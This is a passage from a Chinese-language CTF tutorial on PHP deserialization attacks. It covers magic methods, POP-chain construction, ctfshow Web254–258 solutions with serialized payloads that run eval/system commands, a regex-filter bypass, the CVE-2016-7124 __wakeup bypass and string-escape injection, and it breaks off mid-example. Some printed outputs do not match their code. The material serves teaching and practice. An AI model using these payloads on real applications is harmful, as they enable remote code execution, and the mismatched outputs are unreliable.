输出：-----toString函数被调用----------toString函数被调用----------toString函数被调用-----*/\n\n\n__call($method,$args)\n\n\n触发时机：调用某个方法，若该方法不存在，则自动调用该魔术方法，否则只调用存在的方法\n\n\n利用方法：\n12345678910111213141516171819202122class user &#123;      public $name = &quot;ling&quot;;      public $age;        public function getName() : string      &#123;          return $this-&gt;name;      &#125;        public function __call($method, $args)      &#123;          echo &quot;-----方法&quot; . $method . &quot;不存在-----&quot;;      &#125;  &#125;    $user = new user();  echo $user-&gt;getName() . PHP_EOL;  $user-&gt;getAge();/* 输出：ling-----方法getAge不存在-----*/\n\n\n__callStatic($method,$args)\n\n\n触发时机：在静态上下文中调用不可访问的方法时触发\n\n\n利用方法：\n12345678910111213141516171819202122class user &#123;      public static $name = &quot;ling&quot;;      public $age;        public static function getName() : string      &#123;          return user::$name;      &#125;        public static function __callStatic($method, $args)      &#123;          echo &quot;-----方法&quot; . $method . &quot;不存在-----&quot;;      &#125;  &#125;    $user = new user();  echo user::getName() . PHP_EOL;  user::getAge();/* 输出：ling-----方法getAge不存在-----*/\n\n\n__get($name)\n\n\n触发时机：读取不存在的对象属性时，自动调用该方法\n\n\n利用方法：\n1234567891011121314151617class user &#123;      public $name = &quot;ling&quot;;      public $age;        public function __get($name)      &#123;          echo &quot;-----读取不到属性&quot; . $name . &quot;-----&quot;;      &#125;  &#125;    $user = new user();  echo $user-&gt;name . PHP_EOL;  echo $user-&gt;sex;/* 输出：ling-----读取不到属性sex-----*/\n\n\n__set($name,$value)\n\n\n触发时机：设置不存在的对象属性时，自动调用该方法\n\n\n利用方法：\n1234567891011121314class user &#123;      public $name = &quot;ling&quot;;      public $age;        public function __set($name, $value)      &#123;          echo &quot;-----无法设置属性&quot; . $name . &quot;的值为&quot; . $value . &quot;-----&quot;;      &#125;  &#125;    $user = new user();  $user-&gt;name = &quot;gaidy&quot;;  $user-&gt;sex = &quot;male&quot;;// 输出：-----无法设置属性sex的值为male-----\n\n\n__isset($name)\n\n\n触发时机：在不可访问或者不存在的属性上调用isset()或者empty()函数时自动触发\n\n\n利用方法:\n123456789101112131415161718class user &#123;      private $name = &quot;ling&quot;;      public $age;        public function __isset($name)      &#123;          echo &quot;-----无法判断私有属性&quot; . $name . &quot;是否已赋值-----&quot; . PHP_EOL;      &#125;  &#125;    $user = new user();  echo isset($user-&gt;age);  echo isset($user-&gt;name);  echo isset($user-&gt;username);/* 输出：-----无法判断私有属性name是否已赋值----------无法判断私有属性username是否已赋值-----*/\n\n\n__unset($name)\n\n\n触发时机：在不可访问或者不存在的属性上使用unset()时自动触发\n\n\n利用方法：\n123456789101112131415161718class user &#123;      public $name = &quot;ling&quot;;      private $age;        public function __unset($name)      &#123;          echo &quot;-----无法销毁变量&quot; . $name . &quot;------&quot; . PHP_EOL;      &#125;  &#125;    $user = new user();  unset($user-&gt;name);  unset($user-&gt;age);  unset($user-&gt;username);/* 输出：-----无法销毁变量age-----------无法销毁变量username------*/\n\n\n__clone()\n\n\n触发时机：当对象被克隆时自动调用\n\n\n利用方法\n1234567891011121314class user &#123;      private $name = &quot;ling&quot;;      public $age;        public function __clone()      &#123;          echo &quot;-----clone方法正在被调用-----&quot;;      &#125;  &#125;    $user1 = new user();  $user2 = clone $user1;// 输出：-----clone方法正在被调用-----\n\n\n其他魔术方法\n\n__set_state()：调用var_export()导出类时，此静态方法会被调用\n__autoload()：尝试加载未定义的类时自动调用\n__debugInfo()：打印所需调试信息\n\n在反序列化中的运用\n\n\n上面反序列化中常见的魔术方法了，经常在CTF中组合起来考察POP链的构造\n\n二、案例演示\n\n\n先用一个经典的反序列化漏洞代码来体会下这个过程，代码如下\n12345678class A &#123;    public $cmd = &#x27;id&#x27;;    public function __destruct() &#123;        system($this-&gt;cmd);    &#125;&#125;// 进行序列化操作unserialize($_GET[&#x27;obj&#x27;]);\n\n\n假设有这样一个代码，现在它看起来好像没什么危害对不对，虽然有命令执行，但是$cmd是固定且安全的命令\n\n\n如果你这么想就大错特错了，一切的一切都源自于unserialize()这个函数，并且传入的内容还是可控的\n\n\n于是我们就可以尝试自己构造POP链去让其反序列化为一个恶意对象，比如它的$cmd值为ipconfig，当这个对象销毁的时候就会自动调用__destruct()函数，于是就会执行system('ipconfig');，不就造成RCE了吗？\n\n\n那这里我们怎么构造POP链去恶意利用呢？这里很简单，分三步：\n\n将所有代码复制过来\n将需要修改的东西保留，将不需要修改的东西删掉\n修改并进行序列化操作\n\n\n\n第一步，将代码复制到一个新的文件中\n\n\n第二步，将不需要的东西删去，那这里我们要修改的东西就只有$cmd参数的值，所以这个保留\n\n\n第三步，修改我们想要的值，那这里就改成$cmd='ipconfig'好了，最后序列化输出\n\n\n修改后的代码如下\n12345class A &#123;    public $cmd = &#x27;ipconfig&#x27;;&#125;echo serialize(new A());// 输出：O:1:&quot;A&quot;:1:&#123;s:3:&quot;cmd&quot;;s:8:&quot;ipconfig&quot;;&#125;\n\n\n然后我们通过参数传入，看看它是否正确执行我们的命令\n\n\n\nWeb254\n\n\n源码如下：\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;?php  error_reporting(0);  highlight_file(__FILE__);  include(&#x27;flag.php&#x27;);    class ctfShowUser  &#123;      public $username = &#x27;xxxxxx&#x27;;    //这里它的默认值都为xxxxxx    public $password = &#x27;xxxxxx&#x27;;      public $isVip = false;        public function checkVip()      &#123;          return $this-&gt;isVip;      &#125;        public function login($u, $p)      &#123;          if ($this-&gt;username **= $u &amp;&amp; $this-&gt;password **= $p) &#123;              $this-&gt;isVip = true;          &#125;                                 //这里是我们的第二步，看有没有让$isVip属性为True的代码        return $this-&gt;isVip;              //这里通过让$username、$password传入的$u、$p相等即可，于是我们要去    &#125;                                     //找哪里调用了login()函数传参      public function vipOneKeyGetFlag()      &#123;          if ($this-&gt;isVip) &#123;              global $flag;              echo &quot;your flag is &quot; . $flag;          &#125; else &#123;              echo &quot;no vip, no flag&quot;;       //这里是第一步，我们先找flag在哪，然后从后往前推，而想要到达这里，我们        &#125;                                 //首先要让$isVip属性为True    &#125;  &#125;    $username = $_GET[&#x27;username&#x27;];  $password = $_GET[&#x27;password&#x27;];    if (isset($username) &amp;&amp; isset($password)) &#123;      $user = new ctfShowUser();      if ($user-&gt;login($username, $password)) &#123;  //第三步，看传入参数的方式以及传入时是否做了处理        if ($user-&gt;checkVip()) &#123;               //可以看到这里并没有进行什么处理，直接get传参就行让username和            $user-&gt;vipOneKeyGetFlag();         //password的内容为xxxxxx        &#125;       &#125; else &#123;          echo &quot;no vip,no flag&quot;;      &#125;  &#125;\n\n\n虽然这个代码很长，但是跟反序列化没有什么关系，就是简单的代码审计漏洞\n\n\nWeb255\n\n\n源码如下：\n123456789101112131415161718192021222324252627282930313233343536373839&lt;?php  error_reporting(0);  highlight_file(__FILE__);  include(&#x27;flag.php&#x27;);    class ctfShowUser&#123;      public $username=&#x27;xxxxxx&#x27;;      public $password=&#x27;xxxxxx&#x27;;      public $isVip=false;        public function checkVip()&#123;          return $this-&gt;isVip;      &#125;      public function login($u,$p)&#123;          return $this-&gt;username**=$u&amp;&amp;$this-&gt;password**=$p;      &#125;      public function vipOneKeyGetFlag()&#123;          if($this-&gt;isVip)&#123;              global $flag;              echo &quot;your flag is &quot;.$flag;          &#125;else&#123;              echo &quot;no vip, no flag&quot;;          &#125;      &#125;  &#125;    $username=$_GET[&#x27;username&#x27;];  $password=$_GET[&#x27;password&#x27;];    if(isset($username) &amp;&amp; isset($password))&#123;      $user = unserialize($_COOKIE[&#x27;user&#x27;]);      if($user-&gt;login($username,$password))&#123;          if($user-&gt;checkVip())&#123;              $user-&gt;vipOneKeyGetFlag();          &#125;      &#125;else&#123;          echo &quot;no vip,no flag&quot;;      &#125;  &#125;\n\n\n这个题再刚刚的基础上加了一个反序列化，但拿到flag的思路是差不多的，让$isVip = True，但是这里并没有直接设置这一点的地方\n\n\n但代码里有unserialize()函数上，他会构造一个user对象赋值给$user，而这个user的值使我们可以控制的\n\n\n那我们就可以构造pop链\n1234567&lt;?php  class ctfShowUser&#123;      public $isVip=true;  &#125;    echo serialize(new ctfShowUser());// 输出：O:11:&quot;ctfShowUser&quot;:1:&#123;s:5:&quot;isVip&quot;;b:1;&#125;\n\n\n因为这里我们只用改$isVip的值，所以只需要这样即可\n\n\n然后因为这里我们进行传入的点是cookie，为了不出错，我们先将他进行URL编码\n\n\n由于这里需要根据login()方法的返回值判断是否给出flag，所以还需要传入与对象属性相等的账号和密码\n\n\n\nWeb256\n\n\n源码如下：\n1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?php  error_reporting(0);  highlight_file(__FILE__);  include(&#x27;flag.php&#x27;);    class ctfShowUser&#123;      public $username=&#x27;xxxxxx&#x27;;      public $password=&#x27;xxxxxx&#x27;;      public $isVip=false;        public function checkVip()&#123;          return $this-&gt;isVip;      &#125;      public function login($u,$p)&#123;          return $this-&gt;username**=$u&amp;&amp;$this-&gt;password**=$p;      &#125;      public function vipOneKeyGetFlag()&#123;          if($this-&gt;isVip)&#123;              global $flag;              if($this-&gt;username!**$this-&gt;password)&#123;                  echo &quot;your flag is &quot;.$flag;              &#125;          &#125;else&#123;              echo &quot;no vip, no flag&quot;;          &#125;      &#125;  &#125;    $username=$_GET[&#x27;username&#x27;];  $password=$_GET[&#x27;password&#x27;];    if(isset($username) &amp;&amp; isset($password))&#123;      $user = unserialize($_COOKIE[&#x27;user&#x27;]);      if($user-&gt;login($username,$password))&#123;          if($user-&gt;checkVip())&#123;              $user-&gt;vipOneKeyGetFlag();          &#125;      &#125;else&#123;          echo &quot;no vip,no flag&quot;;      &#125;  &#125;\n\n\n整体逻辑和上面没什么太大的区别，唯一有改动的地方就是，传入的username和password的值不能相等，所以我们构造的时候将两个值改成不一样的就行\n123456789&lt;?php  class ctfShowUser&#123;      public $username=&#x27;gcaliez&#x27;;      public $password=&#x27;admin&#x27;;      public $isVip=true;  &#125;    echo serialize(new ctfShowUser());// 输出：O:11:&quot;ctfShowUser&quot;:3:&#123;s:8:&quot;username&quot;;s:7:&quot;gcaliez&quot;;s:8:&quot;password&quot;;s:8:&quot;admin123&quot;;s:5:&quot;isVip&quot;;b:1;&#125;\n\n\n最后编码传入即可\n\n\nWeb257\n\n\n源码如下\n12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?php  error_reporting(0);  highlight_file(__FILE__);    class ctfShowUser&#123;      private $username=&#x27;xxxxxx&#x27;;      private $password=&#x27;xxxxxx&#x27;;       //第四步    private $isVip=false;      private $class = &#x27;info&#x27;;        public function __construct()&#123;    //第三步        $this-&gt;class=new info();      &#125;      public function login($u,$p)&#123;          return $this-&gt;username**=$u&amp;&amp;$this-&gt;password**=$p;      &#125;      public function __destruct()&#123;          $this-&gt;class-&gt;getInfo();    //第二步    &#125;    &#125;    class info&#123;      private $user=&#x27;xxxxxx&#x27;;      public function getInfo()&#123;          return $this-&gt;user;      &#125;  &#125;    class backDoor&#123;      private $code;                 //最后将code的值改成我们想要执行的恶意代码即可    public function getInfo()&#123;          eval($this-&gt;code);         //第一步    &#125;  &#125;    $username=$_GET[&#x27;username&#x27;];  $password=$_GET[&#x27;password&#x27;];    if(isset($username) &amp;&amp; isset($password))&#123;      $user = unserialize($_COOKIE[&#x27;user&#x27;]);      $user-&gt;login($username,$password);  &#125;\n\n\n我们还是遵循之前的步骤先找到这道题的终点，从后往前看\n1234567894.最后将class的值改成 backDoor ，然后再将private改成public，这样直接内部改值就可以了3.我们发现在__construct() 函数可以将class指向的对象变成 new backDoor，这样的话就可以  解决__destruct()调用的不是backDoor的问题了2.要想调用 getinfo() 函数我们需要用到 __destruct() 方法，但我们希望他调用的是  backDoor中的 getinfo()函数，而不是class    1.这里并没有直接输出flag的地方，但我们观察里面有一个 eval()函数，那我们的目的就是让代码走到这里\n\n\n构造pop链如下：\n123456789101112131415&lt;?php  class ctfShowUser&#123;      // 需要将private改为public!    public $class = &quot;backDoor&quot;;      public function __construct()&#123;          $this-&gt;class=new backDoor();      &#125;  &#125;    class backDoor&#123;  \t// 需要将private改为public!    public $code = &quot;system(&#x27;tac flag.php&#x27;);&quot;;  &#125;    echo serialize(new ctfShowUser());\n\n\nWeb258\n\n\n源码如下：\n123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;?php  error_reporting(0);  highlight_file(__FILE__);    class ctfShowUser&#123;      public $username=&#x27;xxxxxx&#x27;;      public $password=&#x27;xxxxxx&#x27;;      public $isVip=false;      public $class = &#x27;info&#x27;;        public function __construct()&#123;          $this-&gt;class=new info();      &#125;      public function login($u,$p)&#123;          return $this-&gt;username**=$u&amp;&amp;$this-&gt;password**=$p;      &#125;      public function __destruct()&#123;          $this-&gt;class-&gt;getInfo();      &#125;    &#125;    class info&#123;      public $user=&#x27;xxxxxx&#x27;;      public function getInfo()&#123;          return $this-&gt;user;      &#125;  &#125;    class backDoor&#123;      public $code;      public function getInfo()&#123;          eval($this-&gt;code);      &#125;  &#125;    $username=$_GET[&#x27;username&#x27;];  $password=$_GET[&#x27;password&#x27;];    if(isset($username) &amp;&amp; isset($password))&#123;      if(!preg_match(&#x27;/[oc]:\\d+:/i&#x27;, $_COOKIE[&#x27;user&#x27;]))&#123;          $user = unserialize($_COOKIE[&#x27;user&#x27;]);      &#125;      $user-&gt;login($username,$password);  &#125;\n\n\n这题在上一题的基础上过滤了几个关键字\n\n[oc]表示拦截了字母o或c\n:表示紧跟冒号\n\\d+:表示至少一个数字，后面再跟冒号\n\n\n\n也就是说一旦传入的序列化内容中有o:6、c:8这样的东西，就会被过滤\n\n\n这里有几种绕过方法\n\n+号绕过：PHP 接受 O:+123: 作为合法对象标记\n空格绕过：也是合法的（PHP 容忍空格）。\n科学计数法绕过：O:4e0: 等价于 O:4:\n利用 S 大写十六进制字符串：PHP 序列化里还有一种 S 形式，比如 S:4:&quot;\\75ser&quot; 也能还原成 &quot;user&quot;，而正则只认小写 s。\n\n\n\n我们这里使用第一种，依旧是之前的三部曲构造pop链\n12345678910111213141516171819202122232425&lt;?php  class ctfShowUser&#123;      public $class = &#x27;backDoor&#x27;;        public function __construct()&#123;          $this-&gt;class=new backDoor();      &#125;  &#125;    class backDoor&#123;      public $code = &quot;system(&#x27;tac flag.php&#x27;);&quot;;  &#125;    $user = new CtfShowUser();  $u = serialize($user);  echo $u . PHP_EOL;  // 序列化之后替换绕过  $uu = str_replace(&#x27;O:&#x27;, &#x27;O:+&#x27;, $u);  $uuu = str_replace(&#x27;C:&#x27;, &#x27;C:+&#x27;, $uu);  echo $uuu;/* 输出：O:11:&quot;ctfShowUser&quot;:1:&#123;s:5:&quot;class&quot;;O:8:&quot;backDoor&quot;:1:&#123;s:4:&quot;code&quot;;s:23:&quot;system(&#x27;tac flag.php&#x27;);&quot;;&#125;&#125;O:+11:&quot;ctfShowUser&quot;:1:&#123;s:5:&quot;class&quot;;O:+8:&quot;backDoor&quot;:1:&#123;s:4:&quot;code&quot;;s:23:&quot;system(&#x27;tac flag.php&#x27;);&quot;;&#125;&#125;*/\n\n\n三、进阶绕过\nPHP 属性类型-公有&amp;私有&amp;受保护\n\n\n在 PHP 中，对象的属性有三种访问控制符修饰\n\n\n\npublic：公有属性，该属性可以在任何地方被访问（本类内部、外部类、子类）\nprotected：受保护属性，只有在本类、子类或者父类中访问\nprivate：私有属性，只有本类内部可以访问\n\n\n\n\n\n在序列化中，不同的访问控制符修饰的属性会被转为不同的数据：\n\npublic属性序列化后格式是正常的成员名\nprivate属性序列化后格式为 %00类名%00 成员名\nprotected属性序列化后格式为 %00\\*%00 成员名\n\n\n\n比如：\n1O:4:&quot;test&quot;:3:&#123;s:4:&quot;name&quot;;s:6:&quot;xiaodi&quot;;s:9:&quot; test age&quot;;s:2:&quot;31&quot;;s:6:&quot; * sex&quot;;s:3:&quot;man&quot;;&#125;\n\n\n不管怎么说，构造POP链的时候都按照两种构造方式尝试一下：\n\n按原有的控制符直接构造\n按public控制符构造\n\n\n\n利用反射突破私有属性\n\n在 PHP 中，反射（Reflection） 是一套内置的 API（主要通过ReflectionClass、ReflectionProperty等类实现），它允许程序在运行时 “反向探测” 类、方法、属性的结构信息，甚至可以突破访问控制修饰符（如private、protected）的限制，直接操作这些原本受保护的成员。\n\n为什么需要反射来绕过 private 属性？\n\n\n前面介绍过，在 PHP 中，类的属性有三种访问控制修饰符：\n\npublic：公开的，任何地方都能访问\nprotected：受保护的，仅类自身和子类可访问\nprivate：私有的，仅类自身内部可访问，外部（包括子类）都不能直接读写\n\n\n\n这里用一道西电新生赛的一道题来进行讲解\n\n\n1234567891011121314151617181920212223&lt;?phphighlight_file(__FILE__);class PersonA &#123;    private $name;    function __wakeup() &#123;        $name=$this-&gt;name;        $name-&gt;work();    &#125;&#125;class PersonB &#123;    public $name;    function work()&#123;        $name=$this-&gt;name;        eval($name);    &#125;&#125;if(isset($_GET[&#x27;person&#x27;])) &#123;    unserialize($_GET[&#x27;person&#x27;]);&#125;\n\n通过观察我们发现，里面有命令执行函数，我们可以通过改 name 的值，来进行获取flag的操作\n但这里PersonA类的$name是private属性，如果我们直接尝试在类外部给$name赋值（比如$a -&gt; name = $b），会直接报错，因为 PHP 不允许外部访问私有属性。但我们的利用场景又必须给PersonA的$name赋值一个PersonB实例（才能形成PersonA-&gt;__wakeup() → PersonB-&gt;work() → eval()的调用链），这个时候就需要用反射来突破private的限制\n\n绕过的具体步骤\n（1）创建目标对象\n\n\n先实例化PersonA和PersonB：\n12$a = new PersonA(); // 需要设置私有属性的对象$b = new PersonB(); // 要赋值给私有属性的值\n\n\n（2）通过反射获取类结构\n\n\n使用ReflectionClass创建PersonA的反射对象，用于分析类的结构：\n12$reflectionClass = new ReflectionClass(&#x27;PersonA&#x27;); // 反射对象可以获取PersonA类的所有信息（包括私有成员）\n\n\n（3）获取私有属性的反射对象\n\n\n通过反射类获取$name属性的反射对象：\n12$reflectionProperty = $reflectionClass-&gt;getProperty(&#x27;name&#x27;); // 获取PersonA类中名为&quot;name&quot;的属性（无论其访问修饰符是什么）\n\n\n（4）突破访问限制\n\n\n私有属性默认是“不可访问”的，通过setAccessible(true)解除限制：\n12$reflectionProperty-&gt;setAccessible(true); // 关键步骤：强制设置该私有属性可被外部访问\n\n\n（5）给私有属性赋值\n\n\n后用setValue()方法给私有属性赋值：\n12$reflectionProperty-&gt;setValue($a, $b); // 将$b（PersonB实例）赋值给$a（PersonA实例）的$name属性\n\n\n为什么反射能绕过 private？\n\nPHP 的反射机制本质上是提供了一套“元编程”能力，允许程序在运行时操作类的内部结构。serAccessible(true)方法的作用是临时关闭访问控制检查，让外部代码可以读写原本受保护的成员（private/protected）\n这一机制设计的初衷是为了方便调试、测试或框架开发（比如 ORM 框架需要读写对象的私有属性），但如果被滥用，就可以绕过类的封装性，被漏洞利用。\n\n绕过漏洞-CVE\nCVE-2016-7124\n\n\n漏洞描述：反序列化在解析序列化字符串时，如果字符串中声明的属性个数大于实际给出的属性个数，PHP会直接跳过__wakeup()的执行\n\n\n影响版本：PHP 5.X &lt; 5.6.25；PHP 7.X &lt; 7.0.10\n\n\n利用条件：\n\n目标脚本使用unserialieze()且参数可控\n被反序列化的类定义了__wakeup()，并在其中执行了安全校验或变量初始化\n同一类在__destruct()/__toString()等其他魔术方法里存在可利用的敏感操作（任意文件读写、命令执行）\n\n\n\n下面用ctf的题目俩进行漏洞的利用，题目是[极客大挑战 2019](https://buuoj.cn/challenges#[极客大挑战 2019]PHP)\n\n\n\n提示有备份文件，这里可以用扫描工具，最后扫出来是www.zip，我们下载下来并进行分析代码\n\n\n\nflag.php点开之后是假的，那我们就不用管他了，直接看index.php，主要代码是这个\n12345&lt;?php  include &#x27;class.php&#x27;;  $select = $_GET[&#x27;select&#x27;];  $res=unserialize(@$select);  ?&gt;\n\n\n这里我们传入的参数是select，然后对他进行反序列化，这里还包含了class.php我们点开分析一下\n12345678910111213141516171819202122232425262728293031class Name&#123;      private $username = &#x27;nonono&#x27;;      private $password = &#x27;yesyes&#x27;;        public function __construct($username,$password)&#123;          $this-&gt;username = $username;          $this-&gt;password = $password;      &#125;        function __wakeup()&#123;          $this-&gt;username = &#x27;guest&#x27;;      &#125;        function __destruct()&#123;          if ($this-&gt;password != 100) &#123;              echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;              echo &quot;You name is: &quot;;              echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;              echo &quot;You password is: &quot;;              echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;              die();          &#125;          if ($this-&gt;username **= &#x27;admin&#x27;) &#123;              global $flag;              echo $flag;          &#125;else&#123;              echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;;              die();            &#125;      &#125;  &#125;\n\n\n通过分析可得，我们需要将username = 'admin'并且password = 100，才能得到flag\n\n\n但是我们传入值的时候，必然要用到反序列化，这时我们就会触发__wakeup()这个魔术方法，他会将我们的值变为其他的值，这样就会被过滤，而我们也不能改变魔术方法的内容，只能进行绕过，那我们就可以用上面提到的漏洞\n\n\n先看一下他的PHP版本符不符合，这里可以使用插件或者抓包\n\n\n\n这里可以看到，他的PHP版本是符合我们的要求的\n12345678&lt;?php  class Name&#123;      private $username = &#x27;admin&#x27;;      private $password = 100;  &#125;    echo serialize(new Name());// 输出：O:4:&quot;Name&quot;:2:&#123;s:14:&quot; Name username&quot;;s:5:&quot;admin&quot;;s:14:&quot; Name password&quot;;i:100;&#125;\n\n\n这里要将Name后面的2改成比他大的数，然后我们再URL编码一下，最后传入即可\n\n\n\n字符串逃逸\nPHP特性\n\n\n在理解字符串逃逸之前，我们先来说一个重要的东西，就是PHP特性\n\n\n对于反序列化字符串，PHP是严格按照长度读取字符的，而不是依靠引号和分号\n\n\n而底层代码是以 ; 作为字段的分隔，以 &#125; 作为结尾（字符串除外）并且是根据长度判断内容的\n\n\n比如有一个反序列化的字符串：\n123456789$x = &#x27;O:1:&quot;a&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:20;&#125;&#x27;;print_r(unserialize($x));/* 输出：a Object(    [name] =&gt; admin    [age] =&gt; 20)*/\n\n\n我们将name值后面的部分加到后面，变成这样：\n123456789$x = &#x27;O:1:&quot;a&quot;:2:&#123;s:4:&quot;name&quot;;s:23:&quot;admin&quot;;s:3:&quot;age&quot;;i:20;&#125;&quot;;s:3:&quot;age&quot;;i:20;&#125;&#x27;;print_r(unserialize($x));/* 输出：a Object(    [name] =&gt; admin&quot;;s:3:&quot;age&quot;;i:20;&#125;    [age] =&gt; 20)*/\n\n\n从上面的例子就可以看出，PHP它是以前面的数字去进行切分的，而不是通过引号或者分号去切分\n\n\n原理\n\n\n字符串逃逸就是在序列化字符串被过滤（字符变多或变少）后，利用长度不匹配的特性，将攻击者构造的恶意数据挤进反序列化结果中\n\n\n现在有一个反序列化数据：\n1O:1:&quot;a&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:20;&#125;\n\n\n然后假设我们存在过滤或者替换，将admin替换成为其他的字符，那这里就存在两种情况：\n\n字符串增多：占位\n字符串减少：补位\n\n\n\n接下来演示这两种情况：\n\n\n字符串增多\n\n\n比如当讲admin替换成hacker时（这是字符串增多一位），也就是现在反序列化数据变成了：\n1O:1:&quot;a&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;hacker&quot;;s:3:&quot;age&quot;;i:20;&#125;\n\n\n但由于PHP是严格按照长度解析数据的，这样的化就解析不了了，那怎么才能让他自己解析呢？\n\n\n我们可以先数一数admin后面有多少个字符，这里有18个;s:3:&quot;age&quot;;i:20;&#125;\n1234最开始的时候是：admin 5个字符 替换之后：hacker 6个字符但如果我们写18个admin，那就是 18 * 5 =90个字符替换成hacker 就是 18 * 6 =108个字符这个时候为了让他识别正确的字符创，我们还差18个字符串，那么我们就可以用后面的 ;s:3:&quot;age&quot;;i:20;&#125; 去补上去，这样就是18 *6 =18 *6了，数据就可以进行正常解析\n\n\n于是我们构造出来逃逸的反序列化数据就是：\n1234567891011O:1:&quot;a&quot;:2:&#123;s:4:&quot;name&quot;;s:108:&quot;adminadmi...admin&quot;;s:3:&quot;age&quot;;i:20;&#125;\t\t\t\t\t\t\t\t18个admin           18个其他字符// 解析得到的对象为:/*a Object(    [name] =&gt; admin...admin&quot;;s:3:&quot;age&quot;;i:20;&#125;)*/\n\n\n而替换之后就变成了\n12345678910O:1:&quot;a&quot;:2:&#123;s:4:&quot;name&quot;;s:108:&quot;hacker...hacker&quot;;s:3:&quot;age&quot;;i:20;&#125;\t\t\t\t\t\t\t\t18个hacker// 解析得到的对象为:/*a Object(    [name] =&gt; hacker...hacker    [age] =&gt; 20)*/\n\n\n这样我们就将 age 和他的值成功的逃逸出来了\n\n\n字符串减少\n\n\n而当admin被替换成了hack（字符串少了一位），这时反序列化就变成了：\n1O:1:&quot;a&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;hack&quot;;s:3:&quot;age&quot;;i:20;&#125;\n\n\n这同样解析不了，因为分号被解析到字符串转给你了，所以他没办法读到下一个数据，那这里怎么让他进行解析呢？\n\n\n我们还是来数下admin后面的数据长度 &quot;;s:3:&quot;age&quot;;i:20;&#125;，一共有18个字符\n123456现在：admin(5个字符)    替换之后：hack(4个字符)如果我写18个admin呢？就是 18 * 5 = 90 个字节替换之后就变成了18个hack  --&gt;  就是 18 * 4 = 72 个字节那如果要让他识别到正确的字符串，我是不是最后这里还少了18个字节？那这18个字节谁补给它呢？就正好是我们标注出来的18个字节啊\n\n\n于是我们构造出来逃逸的反序列化数据就是：\n1234567891011O:1:&quot;a&quot;:2:&#123;s:4:&quot;name&quot;;s:90:&quot;adminadmi...admin&quot;;s:3:&quot;age&quot;;i:20;&#125;&quot;;s:3:&quot;age&quot;;i:999;&#125;\t\t\t\t\t18个admin           18个其他字符// 解析得到的对象为:/*a Object(    [name] =&gt; admin...admin    [age] =&gt; 20    // 舍弃掉后面的东西)*/\n\n\n那它替换之后，就变成了这个数据：\n1234567891011O:1:&quot;a&quot;:2:&#123;s:4:&quot;name&quot;;s:90:&quot;hack...hack&quot;;s:3:&quot;age&quot;;i:20;&#125;&quot;;s:3:&quot;age&quot;;i:999;&#125;\t\t\t\t\t18个hack// 解析得到的对象为:/*a Object(    [name] =&gt; hacker...hacker&quot;;s:3:&quot;age&quot;;i:20;&#125;    [age] =&gt; 999    // 覆盖掉原来的age值)*/\n\n\n实战案例\n\n\n源码如下：\n12345678910111213141516171819// flag in flag.phpfunction waf($str) &#123;\treturn str_replace(&quot;bad&quot;, &quot;good&quot;, $str);&#125;class GetFlag &#123;    public $key;    public $cmd = &quot;whoami&quot;;    public function __construct($key)    &#123;        $this-&gt;key = $key;    &#125;    public function __destruct()    &#123;        system($this-&gt;cmd);    &#125;&#125; unserialize(waf(serialize(new GetFlag($_GET[&#x27;key&#x27;]))));\n\n\n这个题的逻辑就是只让我们输入key去构造一个对象，然后序列化、反序列化命令执行cmd\n\n\n那么我们的思路就很明了了，尝试去修改它的$cmd参数，导致命令执行\n\n\n这里如果我们直接去尝试构造pop链的话是没有用的，因为它只接受key去生成对象，比如你构造为：\n1?key=123&quot;;s:3:&quot;cmd&quot;;s:6:&quot;whoami&quot;;&#125;\n\n\n这样并没有什么用，他只是对key赋值，并不会改动cmd\n\n\n但是真的构造不了吗？我们可以看到有一个waf()函数，他会将我们传入的bad替换为good，那这个就会导致字符串增长，这不典型的字符串逃逸吗\n\n\n这里我们简单分析一下，首先生成一个正常的反序列化数据，然后改动cmd的值为我们想要他执行的东西\n1O:7:&quot;GetFlag&quot;:2:&#123;s:3:&quot;key&quot;;s:3:&quot;123&quot;;s:3:&quot;cmd&quot;;s:2:&quot;ls&quot;;&#125;\n\n\n现在我们数一数123后面一个有几个字符&quot;;s:3:&quot;cmd&quot;;s:2:&quot;ls&quot;;&#125;，一共有22个，于是我们写入22个bad把参数变成这样：\n1?key=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad&quot;;s:3:&quot;cmd&quot;;s:2:&quot;ls&quot;;&#125;\n\n\n现在它传入之后一解析，key的值变成了badbad...bad&quot;;s:3:&quot;cmd&quot;;s:2:&quot;ls&quot;;&#125;，于是序列化之后的值为：\n1O:7:&quot;GetFlag&quot;:2:&#123;s:3:&quot;key&quot;;s:88:&quot;badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad&quot;;s:3:&quot;cmd&quot;;s:2:&quot;ls&quot;;&#125;&quot;;s:3:&quot;cmd&quot;;s:6:&quot;whoami&quot;;&#125;\n\n\n如果此时不经过waf()函数替换，那么反序列化之后的对象就是这样：\n1234567/*GetFlag Object(    [key] =&gt; badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad&quot;;s:3:&quot;cmd&quot;;s:2:&quot;ls&quot;;&#125;    [cmd] =&gt; whoami)*/\n\n\n再经过waf()函数替换，变成了这样：\n12O:7:&quot;GetFlag&quot;:2:&#123;s:3:&quot;key&quot;;s:88:&quot;badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad&quot;;s:3:&quot;cmd&quot;;s:2:&quot;ls&quot;;&#125;&quot;;s:3:&quot;cmd&quot;;s:6:&quot;whoami&quot;;&#125;\n\n\n中间good刚好88个字符，于是我们后面自己的才cmd就逃逸出来了，赋值为ls，最后的对象为：\n1234567/*GetFlag Object(    [key] =&gt; goodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgood    [cmd] =&gt; 